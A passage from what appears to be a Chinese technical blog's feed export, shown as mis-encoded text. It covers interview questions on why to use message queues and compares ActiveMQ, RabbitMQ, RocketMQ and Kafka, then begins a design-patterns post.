åˆ«å‚»ä¹ä¹çš„è‡ªå·±æ‹è„‘è¢‹çœ‹ä¸ªäººå–œå¥½å°±çç”¨äº†ä¸€ä¸ª MQï¼Œæ¯”å¦‚ Kafkaï¼Œç”šè‡³éƒ½ä»æ²¡è°ƒç ”è¿‡ä¸šç•Œæµè¡Œçš„ MQ åˆ°åº•æœ‰å“ªå‡ ç§ã€‚æ¯ä¸€ä¸ª MQ çš„ä¼˜ç‚¹å’Œç¼ºç‚¹æ˜¯ä»€ä¹ˆã€‚æ¯ä¸€ä¸ª MQ <strong>æ²¡æœ‰ç»å¯¹çš„å¥½å</strong>ï¼Œä½†æ˜¯å°±æ˜¯çœ‹ç”¨åœ¨å“ªä¸ªåœºæ™¯å¯ä»¥<strong>æ‰¬é•¿é¿çŸ­ï¼Œåˆ©ç”¨å…¶ä¼˜åŠ¿ï¼Œè§„é¿å…¶åŠ£åŠ¿</strong>ã€‚<br><br>å¦‚æœæ˜¯ä¸€ä¸ªä¸è€ƒè™‘æŠ€æœ¯é€‰å‹çš„å€™é€‰äººæ‹›è¿›äº†å›¢é˜Ÿï¼Œleader äº¤ç»™ä»–ä¸€ä¸ªä»»åŠ¡ï¼Œå»è®¾è®¡ä¸ªä»€ä¹ˆç³»ç»Ÿï¼Œä»–åœ¨é‡Œé¢ç”¨ä¸€äº›æŠ€æœ¯ï¼Œå¯èƒ½éƒ½æ²¡è€ƒè™‘è¿‡é€‰å‹ï¼Œæœ€åé€‰çš„æŠ€æœ¯å¯èƒ½å¹¶ä¸ä¸€å®šåˆé€‚ï¼Œä¸€æ ·æ˜¯ç•™å‘ã€‚</p></li></ul><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><h3><span id="ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—">ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—</span></h3><p>å…¶å®å°±æ˜¯é—®é—®ä½ æ¶ˆæ¯é˜Ÿåˆ—éƒ½æœ‰å“ªäº›ä½¿ç”¨åœºæ™¯ï¼Œç„¶åä½ é¡¹ç›®é‡Œå…·ä½“æ˜¯ä»€ä¹ˆåœºæ™¯ï¼Œè¯´è¯´ä½ åœ¨è¿™ä¸ªåœºæ™¯é‡Œç”¨æ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>é¢è¯•å®˜é—®ä½ è¿™ä¸ªé—®é¢˜ï¼Œ<strong>æœŸæœ›çš„ä¸€ä¸ªå›ç­”</strong>æ˜¯è¯´ï¼Œä½ ä»¬å…¬å¸æœ‰ä¸ªä»€ä¹ˆ<strong>ä¸šåŠ¡åœºæ™¯</strong>ï¼Œè¿™ä¸ªä¸šåŠ¡åœºæ™¯æœ‰ä¸ªä»€ä¹ˆæŠ€æœ¯æŒ‘æˆ˜ï¼Œå¦‚æœä¸ç”¨ MQ å¯èƒ½ä¼šå¾ˆéº»çƒ¦ï¼Œä½†æ˜¯ä½ ç°åœ¨ç”¨äº† MQ ä¹‹åå¸¦ç»™äº†ä½ å¾ˆå¤šçš„å¥½å¤„ã€‚</p><p>å…ˆè¯´ä¸€ä¸‹æ¶ˆæ¯é˜Ÿåˆ—å¸¸è§çš„ä½¿ç”¨åœºæ™¯å§ï¼Œå…¶å®åœºæ™¯æœ‰å¾ˆå¤šï¼Œä½†æ˜¯æ¯”è¾ƒæ ¸å¿ƒçš„æœ‰ 3 ä¸ªï¼š<strong>è§£è€¦</strong>ã€<strong>å¼‚æ­¥</strong>ã€<strong>å‰Šå³°</strong>ã€‚</p><h4><span id="è§£è€¦">è§£è€¦</span></h4><p>çœ‹è¿™ä¹ˆä¸ªåœºæ™¯ã€‚A ç³»ç»Ÿå‘é€æ•°æ®åˆ° BCD ä¸‰ä¸ªç³»ç»Ÿï¼Œé€šè¿‡æ¥å£è°ƒç”¨å‘é€ã€‚å¦‚æœ E ç³»ç»Ÿä¹Ÿè¦è¿™ä¸ªæ•°æ®å‘¢ï¼Ÿé‚£å¦‚æœ C ç³»ç»Ÿç°åœ¨ä¸éœ€è¦äº†å‘¢ï¼ŸA ç³»ç»Ÿè´Ÿè´£äººå‡ ä¹å´©æºƒâ€¦â€¦</p><p><img src="/2020/03/22/queue-0/mq-1.png" alt="mq-1"></p><p>åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼ŒA ç³»ç»Ÿè·Ÿå…¶å®ƒå„ç§ä¹±ä¸ƒå…«ç³Ÿçš„ç³»ç»Ÿä¸¥é‡è€¦åˆï¼ŒA ç³»ç»Ÿäº§ç”Ÿä¸€æ¡æ¯”è¾ƒå…³é”®çš„æ•°æ®ï¼Œå¾ˆå¤šç³»ç»Ÿéƒ½éœ€è¦ A ç³»ç»Ÿå°†è¿™ä¸ªæ•°æ®å‘é€è¿‡æ¥ã€‚A ç³»ç»Ÿè¦æ—¶æ—¶åˆ»åˆ»è€ƒè™‘ BCDE å››ä¸ªç³»ç»Ÿå¦‚æœæŒ‚äº†è¯¥å’‹åŠï¼Ÿè¦ä¸è¦é‡å‘ï¼Œè¦ä¸è¦æŠŠæ¶ˆæ¯å­˜èµ·æ¥ï¼Ÿå¤´å‘éƒ½ç™½äº†å•Šï¼</p><p>å¦‚æœä½¿ç”¨ MQï¼ŒA ç³»ç»Ÿäº§ç”Ÿä¸€æ¡æ•°æ®ï¼Œå‘é€åˆ° MQ é‡Œé¢å»ï¼Œå“ªä¸ªç³»ç»Ÿéœ€è¦æ•°æ®è‡ªå·±å» MQ é‡Œé¢æ¶ˆè´¹ã€‚å¦‚æœæ–°ç³»ç»Ÿéœ€è¦æ•°æ®ï¼Œç›´æ¥ä» MQ é‡Œæ¶ˆè´¹å³å¯ï¼›å¦‚æœæŸä¸ªç³»ç»Ÿä¸éœ€è¦è¿™æ¡æ•°æ®äº†ï¼Œå°±å–æ¶ˆå¯¹ MQ æ¶ˆæ¯çš„æ¶ˆè´¹å³å¯ã€‚è¿™æ ·ä¸‹æ¥ï¼ŒA ç³»ç»Ÿå‹æ ¹å„¿ä¸éœ€è¦å»è€ƒè™‘è¦ç»™è°å‘é€æ•°æ®ï¼Œä¸éœ€è¦ç»´æŠ¤è¿™ä¸ªä»£ç ï¼Œä¹Ÿä¸éœ€è¦è€ƒè™‘äººå®¶æ˜¯å¦è°ƒç”¨æˆåŠŸã€å¤±è´¥è¶…æ—¶ç­‰æƒ…å†µã€‚</p><p><img src="/2020/03/22/queue-0/mq-2.png" alt="mq-2"></p><p><strong>æ€»ç»“</strong>ï¼šé€šè¿‡ä¸€ä¸ª MQï¼ŒPub&#x2F;Sub å‘å¸ƒè®¢é˜…æ¶ˆæ¯è¿™ä¹ˆä¸€ä¸ªæ¨¡å‹ï¼ŒA ç³»ç»Ÿå°±è·Ÿå…¶å®ƒç³»ç»Ÿå½»åº•è§£è€¦äº†ã€‚</p><p><strong>é¢è¯•æŠ€å·§</strong>ï¼šä½ éœ€è¦å»è€ƒè™‘ä¸€ä¸‹ä½ è´Ÿè´£çš„ç³»ç»Ÿä¸­æ˜¯å¦æœ‰ç±»ä¼¼çš„åœºæ™¯ï¼Œå°±æ˜¯ä¸€ä¸ªç³»ç»Ÿæˆ–è€…ä¸€ä¸ªæ¨¡å—ï¼Œè°ƒç”¨äº†å¤šä¸ªç³»ç»Ÿæˆ–è€…æ¨¡å—ï¼Œäº’ç›¸ä¹‹é—´çš„è°ƒç”¨å¾ˆå¤æ‚ï¼Œç»´æŠ¤èµ·æ¥å¾ˆéº»çƒ¦ã€‚ä½†æ˜¯å…¶å®è¿™ä¸ªè°ƒç”¨æ˜¯ä¸éœ€è¦ç›´æ¥åŒæ­¥è°ƒç”¨æ¥å£çš„ï¼Œå¦‚æœç”¨ MQ ç»™å®ƒå¼‚æ­¥åŒ–è§£è€¦ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½ å°±éœ€è¦å»è€ƒè™‘åœ¨ä½ çš„é¡¹ç›®é‡Œï¼Œæ˜¯ä¸æ˜¯å¯ä»¥è¿ç”¨è¿™ä¸ª MQ å»è¿›è¡Œç³»ç»Ÿçš„è§£è€¦ã€‚åœ¨ç®€å†ä¸­ä½“ç°å‡ºæ¥è¿™å—ä¸œè¥¿ï¼Œç”¨ MQ ä½œè§£è€¦ã€‚</p><h4><span id="å¼‚æ­¥">å¼‚æ­¥</span></h4><p>å†æ¥çœ‹ä¸€ä¸ªåœºæ™¯ï¼ŒA ç³»ç»Ÿæ¥æ”¶ä¸€ä¸ªè¯·æ±‚ï¼Œéœ€è¦åœ¨è‡ªå·±æœ¬åœ°å†™åº“ï¼Œè¿˜éœ€è¦åœ¨ BCD ä¸‰ä¸ªç³»ç»Ÿå†™åº“ï¼Œè‡ªå·±æœ¬åœ°å†™åº“è¦ 3msï¼ŒBCD ä¸‰ä¸ªç³»ç»Ÿåˆ†åˆ«å†™åº“è¦ 300msã€450msã€200msã€‚æœ€ç»ˆè¯·æ±‚æ€»å»¶æ—¶æ˜¯ 3 + 300 + 450 + 200 &#x3D; 953msï¼Œæ¥è¿‘ 1sï¼Œç”¨æˆ·æ„Ÿè§‰æä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œæ…¢æ­»äº†æ…¢æ­»äº†ã€‚ç”¨æˆ·é€šè¿‡æµè§ˆå™¨å‘èµ·è¯·æ±‚ï¼Œç­‰å¾…ä¸ª 1sï¼Œè¿™å‡ ä¹æ˜¯ä¸å¯æ¥å—çš„ã€‚</p><p><img src="/2020/03/22/queue-0/mq-3.png" alt="mq-3"></p><p>ä¸€èˆ¬äº’è”ç½‘ç±»çš„ä¼ä¸šï¼Œå¯¹äºç”¨æˆ·ç›´æ¥çš„æ“ä½œï¼Œä¸€èˆ¬è¦æ±‚æ˜¯æ¯ä¸ªè¯·æ±‚éƒ½å¿…é¡»åœ¨ 200 ms ä»¥å†…å®Œæˆï¼Œå¯¹ç”¨æˆ·å‡ ä¹æ˜¯æ— æ„ŸçŸ¥çš„ã€‚</p><p>å¦‚æœ<strong>ä½¿ç”¨ MQ</strong>ï¼Œé‚£ä¹ˆ A ç³»ç»Ÿè¿ç»­å‘é€ 3 æ¡æ¶ˆæ¯åˆ° MQ é˜Ÿåˆ—ä¸­ï¼Œå‡å¦‚è€—æ—¶ 5msï¼ŒA ç³»ç»Ÿä»æ¥å—ä¸€ä¸ªè¯·æ±‚åˆ°è¿”å›å“åº”ç»™ç”¨æˆ·ï¼Œæ€»æ—¶é•¿æ˜¯ 3 + 5 &#x3D; 8msï¼Œå¯¹äºç”¨æˆ·è€Œè¨€ï¼Œå…¶å®æ„Ÿè§‰ä¸Šå°±æ˜¯ç‚¹ä¸ªæŒ‰é’®ï¼Œ8ms ä»¥åå°±ç›´æ¥è¿”å›äº†ï¼Œçˆ½ï¼ç½‘ç«™åšå¾—çœŸå¥½ï¼ŒçœŸå¿«ï¼</p><p><img src="/2020/03/22/queue-0/mq-4.png" alt="mq-4"></p><h4><span id="å‰Šå³°">å‰Šå³°</span></h4><p>æ¯å¤© 0:00 åˆ° 12:00ï¼ŒA ç³»ç»Ÿé£å¹³æµªé™ï¼Œæ¯ç§’å¹¶å‘è¯·æ±‚æ•°é‡å°± 50 ä¸ªã€‚ç»“æœæ¯æ¬¡ä¸€åˆ° 12:00 ~ 13:00 ï¼Œæ¯ç§’å¹¶å‘è¯·æ±‚æ•°é‡çªç„¶ä¼šæš´å¢åˆ° 5k+ æ¡ã€‚ä½†æ˜¯ç³»ç»Ÿæ˜¯ç›´æ¥åŸºäº MySQL çš„ï¼Œå¤§é‡çš„è¯·æ±‚æ¶Œå…¥ MySQLï¼Œæ¯ç§’é’Ÿå¯¹ MySQL æ‰§è¡Œçº¦ 5k æ¡ SQLã€‚</p><p>ä¸€èˆ¬çš„ MySQLï¼Œæ‰›åˆ°æ¯ç§’ 2k ä¸ªè¯·æ±‚å°±å·®ä¸å¤šäº†ï¼Œå¦‚æœæ¯ç§’è¯·æ±‚åˆ° 5k çš„è¯ï¼Œå¯èƒ½å°±ç›´æ¥æŠŠ MySQL ç»™æ‰“æ­»äº†ï¼Œå¯¼è‡´ç³»ç»Ÿå´©æºƒï¼Œç”¨æˆ·ä¹Ÿå°±æ²¡æ³•å†ä½¿ç”¨ç³»ç»Ÿäº†ã€‚</p><p>ä½†æ˜¯é«˜å³°æœŸä¸€è¿‡ï¼Œåˆ°äº†ä¸‹åˆçš„æ—¶å€™ï¼Œå°±æˆäº†ä½å³°æœŸï¼Œå¯èƒ½ä¹Ÿå°± 1w çš„ç”¨æˆ·åŒæ—¶åœ¨ç½‘ç«™ä¸Šæ“ä½œï¼Œæ¯ç§’ä¸­çš„è¯·æ±‚æ•°é‡å¯èƒ½ä¹Ÿå°± 50 ä¸ªè¯·æ±‚ï¼Œå¯¹æ•´ä¸ªç³»ç»Ÿå‡ ä¹æ²¡æœ‰ä»»ä½•çš„å‹åŠ›ã€‚</p><p><img src="/2020/03/22/queue-0/mq-5.png" alt="mq-5"></p><p>å¦‚æœä½¿ç”¨ MQï¼Œæ¯ç§’ 5k ä¸ªè¯·æ±‚å†™å…¥ MQï¼ŒA ç³»ç»Ÿæ¯ç§’é’Ÿæœ€å¤šå¤„ç† 2k ä¸ªè¯·æ±‚ï¼Œå› ä¸º MySQL æ¯ç§’é’Ÿæœ€å¤šå¤„ç† 2k ä¸ªã€‚A ç³»ç»Ÿä» MQ ä¸­æ…¢æ…¢æ‹‰å–è¯·æ±‚ï¼Œæ¯ç§’é’Ÿå°±æ‹‰å– 2k ä¸ªè¯·æ±‚ï¼Œä¸è¦è¶…è¿‡è‡ªå·±æ¯ç§’èƒ½å¤„ç†çš„æœ€å¤§è¯·æ±‚æ•°é‡å°± okï¼Œè¿™æ ·ä¸‹æ¥ï¼Œå“ªæ€•æ˜¯é«˜å³°æœŸçš„æ—¶å€™ï¼ŒA ç³»ç»Ÿä¹Ÿç»å¯¹ä¸ä¼šæŒ‚æ‰ã€‚è€Œ MQ æ¯ç§’é’Ÿ 5k ä¸ªè¯·æ±‚è¿›æ¥ï¼Œå°± 2k ä¸ªè¯·æ±‚å‡ºå»ï¼Œç»“æœå°±å¯¼è‡´åœ¨ä¸­åˆé«˜å³°æœŸï¼ˆ1 ä¸ªå°æ—¶ï¼‰ï¼Œå¯èƒ½æœ‰å‡ åä¸‡ç”šè‡³å‡ ç™¾ä¸‡çš„è¯·æ±‚ç§¯å‹åœ¨ MQ ä¸­ã€‚</p><p><img src="/2020/03/22/queue-0/mq-6.png" alt="mq-6"></p><p>è¿™ä¸ªçŸ­æš‚çš„é«˜å³°æœŸç§¯å‹æ˜¯ ok çš„ï¼Œå› ä¸ºé«˜å³°æœŸè¿‡äº†ä¹‹åï¼Œæ¯ç§’é’Ÿå°± 50 ä¸ªè¯·æ±‚è¿› MQï¼Œä½†æ˜¯ A ç³»ç»Ÿä¾ç„¶ä¼šæŒ‰ç…§æ¯ç§’ 2k ä¸ªè¯·æ±‚çš„é€Ÿåº¦åœ¨å¤„ç†ã€‚æ‰€ä»¥è¯´ï¼Œåªè¦é«˜å³°æœŸä¸€è¿‡ï¼ŒA ç³»ç»Ÿå°±ä¼šå¿«é€Ÿå°†ç§¯å‹çš„æ¶ˆæ¯ç»™è§£å†³æ‰ã€‚</p><h3><span id="æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹">æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹</span></h3><p>ä¼˜ç‚¹ä¸Šé¢å·²ç»è¯´äº†ï¼Œå°±æ˜¯<strong>åœ¨ç‰¹æ®Šåœºæ™¯ä¸‹æœ‰å…¶å¯¹åº”çš„å¥½å¤„</strong>ï¼Œ<strong>è§£è€¦</strong>ã€<strong>å¼‚æ­¥</strong>ã€<strong>å‰Šå³°</strong>ã€‚</p><p>ç¼ºç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li><p>ç³»ç»Ÿå¯ç”¨æ€§é™ä½<br><br>ç³»ç»Ÿå¼•å…¥çš„å¤–éƒ¨ä¾èµ–è¶Šå¤šï¼Œè¶Šå®¹æ˜“æŒ‚æ‰ã€‚æœ¬æ¥ä½ å°±æ˜¯ A ç³»ç»Ÿè°ƒç”¨ BCD ä¸‰ä¸ªç³»ç»Ÿçš„æ¥å£å°±å¥½äº†ï¼ŒABCD å››ä¸ªç³»ç»Ÿè¿˜å¥½å¥½çš„ï¼Œæ²¡å•¥é—®é¢˜ï¼Œä½ ååŠ ä¸ª MQ è¿›æ¥ï¼Œä¸‡ä¸€ MQ æŒ‚äº†å’‹æ•´ï¼ŸMQ ä¸€æŒ‚ï¼Œæ•´å¥—ç³»ç»Ÿå´©æºƒï¼Œä½ ä¸å°±å®Œäº†ï¼Ÿå¦‚ä½•ä¿è¯æ¶ˆæ¯é˜Ÿåˆ—çš„é«˜å¯ç”¨ï¼Œå¯ä»¥<a href="/2020/03/22/Design-Pattern/" title="ç‚¹å‡»è¿™é‡Œ">ç‚¹å‡»è¿™é‡Œ</a>ã€‚</p></li><li><p>ç³»ç»Ÿå¤æ‚åº¦æé«˜<br><br>ç¡¬ç”Ÿç”ŸåŠ ä¸ª MQ è¿›æ¥ï¼Œä½ æ€ä¹ˆ<a href="/docs/high-concurrency/how-to-ensure-that-messages-are-not-repeatedly-consumed.md">ä¿è¯æ¶ˆæ¯æ²¡æœ‰é‡å¤æ¶ˆè´¹</a>ï¼Ÿæ€ä¹ˆ<a href="/docs/high-concurrency/how-to-ensure-the-reliable-transmission-of-messages.md">å¤„ç†æ¶ˆæ¯ä¸¢å¤±çš„æƒ…å†µ</a>ï¼Ÿæ€ä¹ˆä¿è¯æ¶ˆæ¯ä¼ é€’çš„é¡ºåºæ€§ï¼Ÿå¤´å¤§å¤´å¤§ï¼Œé—®é¢˜ä¸€å¤§å †ï¼Œç—›è‹¦ä¸å·²ã€‚</p></li><li><p>ä¸€è‡´æ€§é—®é¢˜<br><br>A ç³»ç»Ÿå¤„ç†å®Œäº†ç›´æ¥è¿”å›æˆåŠŸäº†ï¼Œäººéƒ½ä»¥ä¸ºä½ è¿™ä¸ªè¯·æ±‚å°±æˆåŠŸäº†ï¼›ä½†æ˜¯é—®é¢˜æ˜¯ï¼Œè¦æ˜¯ BCD ä¸‰ä¸ªç³»ç»Ÿé‚£é‡Œï¼ŒBD ä¸¤ä¸ªç³»ç»Ÿå†™åº“æˆåŠŸäº†ï¼Œç»“æœ C ç³»ç»Ÿå†™åº“å¤±è´¥äº†ï¼Œå’‹æ•´ï¼Ÿä½ è¿™æ•°æ®å°±ä¸ä¸€è‡´äº†ã€‚</p></li></ul><p>æ‰€ä»¥æ¶ˆæ¯é˜Ÿåˆ—å®é™…æ˜¯ä¸€ç§éå¸¸å¤æ‚çš„æ¶æ„ï¼Œä½ å¼•å…¥å®ƒæœ‰å¾ˆå¤šå¥½å¤„ï¼Œä½†æ˜¯ä¹Ÿå¾—é’ˆå¯¹å®ƒå¸¦æ¥çš„åå¤„åšå„ç§é¢å¤–çš„æŠ€æœ¯æ–¹æ¡ˆå’Œæ¶æ„æ¥è§„é¿æ‰ï¼Œåšå¥½ä¹‹åï¼Œä½ ä¼šå‘ç°ï¼Œå¦ˆå‘€ï¼Œç³»ç»Ÿå¤æ‚åº¦æå‡äº†ä¸€ä¸ªæ•°é‡çº§ï¼Œä¹Ÿè®¸æ˜¯å¤æ‚äº† 10 å€ã€‚ä½†æ˜¯å…³é”®æ—¶åˆ»ï¼Œç”¨ï¼Œè¿˜æ˜¯å¾—ç”¨çš„ã€‚</p><h3><span id="kafka-activemq-rabbitmq-rocketmq-æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹">Kafkaã€ActiveMQã€RabbitMQã€RocketMQ æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ</span></h3><table><thead><tr><th>ç‰¹æ€§</th><th>ActiveMQ</th><th>RabbitMQ</th><th>RocketMQ</th><th>Kafka</th></tr></thead><tbody><tr><td>å•æœºååé‡</td><td>ä¸‡çº§ï¼Œæ¯” RocketMQã€Kafka ä½ä¸€ä¸ªæ•°é‡çº§</td><td>åŒ ActiveMQ</td><td>10 ä¸‡çº§ï¼Œæ”¯æ’‘é«˜åå</td><td>10 ä¸‡çº§ï¼Œé«˜ååï¼Œä¸€èˆ¬é…åˆå¤§æ•°æ®ç±»çš„ç³»ç»Ÿæ¥è¿›è¡Œå®æ—¶æ•°æ®è®¡ç®—ã€æ—¥å¿—é‡‡é›†ç­‰åœºæ™¯</td></tr><tr><td>topic æ•°é‡å¯¹ååé‡çš„å½±å“</td><td></td><td></td><td>topic å¯ä»¥è¾¾åˆ°å‡ ç™¾&#x2F;å‡ åƒçš„çº§åˆ«ï¼Œååé‡ä¼šæœ‰è¾ƒå°å¹…åº¦çš„ä¸‹é™ï¼Œè¿™æ˜¯ RocketMQ çš„ä¸€å¤§ä¼˜åŠ¿ï¼Œåœ¨åŒç­‰æœºå™¨ä¸‹ï¼Œå¯ä»¥æ”¯æ’‘å¤§é‡çš„ topic</td><td>topic ä»å‡ ååˆ°å‡ ç™¾ä¸ªæ—¶å€™ï¼Œååé‡ä¼šå¤§å¹…åº¦ä¸‹é™ï¼Œåœ¨åŒç­‰æœºå™¨ä¸‹ï¼ŒKafka å°½é‡ä¿è¯ topic æ•°é‡ä¸è¦è¿‡å¤šï¼Œå¦‚æœè¦æ”¯æ’‘å¤§è§„æ¨¡çš„ topicï¼Œéœ€è¦å¢åŠ æ›´å¤šçš„æœºå™¨èµ„æº</td></tr><tr><td>æ—¶æ•ˆæ€§</td><td>ms çº§</td><td>å¾®ç§’çº§ï¼Œè¿™æ˜¯ RabbitMQ çš„ä¸€å¤§ç‰¹ç‚¹ï¼Œå»¶è¿Ÿæœ€ä½</td><td>ms çº§</td><td>å»¶è¿Ÿåœ¨ ms çº§ä»¥å†…</td></tr><tr><td>å¯ç”¨æ€§</td><td>é«˜ï¼ŒåŸºäºä¸»ä»æ¶æ„å®ç°é«˜å¯ç”¨</td><td>åŒ ActiveMQ</td><td>éå¸¸é«˜ï¼Œåˆ†å¸ƒå¼æ¶æ„</td><td>éå¸¸é«˜ï¼Œåˆ†å¸ƒå¼ï¼Œä¸€ä¸ªæ•°æ®å¤šä¸ªå‰¯æœ¬ï¼Œå°‘æ•°æœºå™¨å®•æœºï¼Œä¸ä¼šä¸¢å¤±æ•°æ®ï¼Œä¸ä¼šå¯¼è‡´ä¸å¯ç”¨</td></tr><tr><td>æ¶ˆæ¯å¯é æ€§</td><td>æœ‰è¾ƒä½çš„æ¦‚ç‡ä¸¢å¤±æ•°æ®</td><td>åŸºæœ¬ä¸ä¸¢</td><td>ç»è¿‡å‚æ•°ä¼˜åŒ–é…ç½®ï¼Œå¯ä»¥åšåˆ° 0 ä¸¢å¤±</td><td>åŒ RocketMQ</td></tr><tr><td>åŠŸèƒ½æ”¯æŒ</td><td>MQ é¢†åŸŸçš„åŠŸèƒ½æå…¶å®Œå¤‡</td><td>åŸºäº erlang å¼€å‘ï¼Œå¹¶å‘èƒ½åŠ›å¾ˆå¼ºï¼Œæ€§èƒ½æå¥½ï¼Œå»¶æ—¶å¾ˆä½</td><td>MQ åŠŸèƒ½è¾ƒä¸ºå®Œå–„ï¼Œè¿˜æ˜¯åˆ†å¸ƒå¼çš„ï¼Œæ‰©å±•æ€§å¥½</td><td>åŠŸèƒ½è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ”¯æŒç®€å•çš„ MQ åŠŸèƒ½ï¼Œåœ¨å¤§æ•°æ®é¢†åŸŸçš„å®æ—¶è®¡ç®—ä»¥åŠæ—¥å¿—é‡‡é›†è¢«å¤§è§„æ¨¡ä½¿ç”¨</td></tr></tbody></table><p>ç»¼ä¸Šï¼Œå„ç§å¯¹æ¯”ä¹‹åï¼Œæœ‰å¦‚ä¸‹å»ºè®®ï¼š</p><p>ä¸€èˆ¬çš„ä¸šåŠ¡ç³»ç»Ÿè¦å¼•å…¥ MQï¼Œæœ€æ—©å¤§å®¶éƒ½ç”¨ ActiveMQï¼Œä½†æ˜¯ç°åœ¨ç¡®å®å¤§å®¶ç”¨çš„ä¸å¤šäº†ï¼Œæ²¡ç»è¿‡å¤§è§„æ¨¡ååé‡åœºæ™¯çš„éªŒè¯ï¼Œç¤¾åŒºä¹Ÿä¸æ˜¯å¾ˆæ´»è·ƒï¼Œæ‰€ä»¥å¤§å®¶è¿˜æ˜¯ç®—äº†å§ï¼Œæˆ‘ä¸ªäººä¸æ¨èç”¨è¿™ä¸ªäº†ï¼›</p><p>åæ¥å¤§å®¶å¼€å§‹ç”¨ RabbitMQï¼Œä½†æ˜¯ç¡®å® erlang è¯­è¨€é˜»æ­¢äº†å¤§é‡çš„ Java å·¥ç¨‹å¸ˆå»æ·±å…¥ç ”ç©¶å’ŒæŒæ§å®ƒï¼Œå¯¹å…¬å¸è€Œè¨€ï¼Œå‡ ä¹å¤„äºä¸å¯æ§çš„çŠ¶æ€ï¼Œä½†æ˜¯ç¡®å®äººå®¶æ˜¯å¼€æºçš„ï¼Œæ¯”è¾ƒç¨³å®šçš„æ”¯æŒï¼Œæ´»è·ƒåº¦ä¹Ÿé«˜ï¼›</p><p>ä¸è¿‡ç°åœ¨ç¡®å®è¶Šæ¥è¶Šå¤šçš„å…¬å¸ä¼šå»ç”¨ RocketMQï¼Œç¡®å®å¾ˆä¸é”™ï¼Œæ¯•ç«Ÿæ˜¯é˜¿é‡Œå‡ºå“ï¼Œä½†ç¤¾åŒºå¯èƒ½æœ‰çªç„¶é»„æ‰çš„é£é™©ï¼ˆç›®å‰ RocketMQ å·²æç»™ <a href="https://github.com/apache/rocketmq">Apache</a>ï¼Œä½† GitHub ä¸Šçš„æ´»è·ƒåº¦å…¶å®ä¸ç®—é«˜ï¼‰å¯¹è‡ªå·±å…¬å¸æŠ€æœ¯å®åŠ›æœ‰ç»å¯¹è‡ªä¿¡çš„ï¼Œæ¨èç”¨ RocketMQï¼Œå¦åˆ™å›å»è€è€å®å®ç”¨ RabbitMQ å§ï¼Œäººå®¶æœ‰æ´»è·ƒçš„å¼€æºç¤¾åŒºï¼Œç»å¯¹ä¸ä¼šé»„ã€‚</p><p>æ‰€ä»¥<strong>ä¸­å°å‹å…¬å¸</strong>ï¼ŒæŠ€æœ¯å®åŠ›è¾ƒä¸ºä¸€èˆ¬ï¼ŒæŠ€æœ¯æŒ‘æˆ˜ä¸æ˜¯ç‰¹åˆ«é«˜ï¼Œç”¨ RabbitMQ æ˜¯ä¸é”™çš„é€‰æ‹©ï¼›<strong>å¤§å‹å…¬å¸</strong>ï¼ŒåŸºç¡€æ¶æ„ç ”å‘å®åŠ›è¾ƒå¼ºï¼Œç”¨ RocketMQ æ˜¯å¾ˆå¥½çš„é€‰æ‹©ã€‚</p><p>å¦‚æœæ˜¯<strong>å¤§æ•°æ®é¢†åŸŸ</strong>çš„å®æ—¶è®¡ç®—ã€æ—¥å¿—é‡‡é›†ç­‰åœºæ™¯ï¼Œç”¨ Kafka æ˜¯ä¸šå†…æ ‡å‡†çš„ï¼Œç»å¯¹æ²¡é—®é¢˜ï¼Œç¤¾åŒºæ´»è·ƒåº¦å¾ˆé«˜ï¼Œç»å¯¹ä¸ä¼šé»„ï¼Œä½•å†µå‡ ä¹æ˜¯å…¨ä¸–ç•Œè¿™ä¸ªé¢†åŸŸçš„äº‹å®æ€§è§„èŒƒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> åˆ†å¸ƒå¼è€ƒç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¶ˆæ¯é˜Ÿåˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¾è®¡æ¨¡å¼ä¹Ÿå¯ä»¥è¿™ä¹ˆç®€å•ã€è½¬ã€‘</title>
      <link href="/2020/03/22/Design-Pattern/"/>
      <url>/2020/03/22/Design-Pattern/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F">åˆ›å»ºå‹æ¨¡å¼</a><ul><li><a href="#%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F">ç®€å•å·¥å‚æ¨¡å¼</a></li><li><a href="#%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F">å·¥å‚æ¨¡å¼</a></li><li><a href="#%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F">æŠ½è±¡å·¥å‚æ¨¡å¼</a></li><li><a href="#%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F">å•ä¾‹æ¨¡å¼</a></li><li><a href="#%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F">å»ºé€ è€…æ¨¡å¼</a></li><li><a href="#%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F">åŸå‹æ¨¡å¼</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93">åˆ›å»ºå‹æ¨¡å¼æ€»ç»“</a></li></ul></li><li><a href="#%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F">ç»“æ„å‹æ¨¡å¼</a><ul><li><a 